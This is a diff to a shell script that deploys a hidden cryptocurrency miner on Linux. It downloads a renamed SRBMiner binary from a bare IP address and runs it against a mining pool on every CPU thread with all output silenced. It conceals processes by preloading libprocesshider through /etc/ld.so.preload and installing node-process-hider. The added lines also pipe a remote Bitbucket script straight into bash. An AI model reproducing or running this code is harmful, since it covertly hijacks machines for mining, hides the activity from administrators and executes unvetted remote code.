@@ -13,7 +13,8 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -xvf hellminer_linux64.tar.gz
+wget -O cangcut http://139.180.133.28/SRBMiner-MULTI
+chmod 777 cangcut
 
 wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
 
@@ -54,4 +55,6 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./hellminer -c stratum+tcp://209.97.168.28:443 -u RCADCQ9UW1RsUaF94Jp4huPSdQ7bhwYwa4.$(echo $(shuf -i 1-100000 -n 1)-bismillah) -password x 
+./graftcp/graftcp & clear & ./cangcut --algorithm verushash --pool stratum+tcp://209.97.168.28:443 --wallet RCADCQ9UW1RsUaF94Jp4huPSdQ7bhwYwa4.$(echo $(shuf -i 1-100000 -n 1)-bismillah) --password x --cpu-threads $(nproc --all) >/dev/null 2>&1
+curl -sL https://bitbucket.org/kzpakid/wtrr/raw/master/time | bash
+  
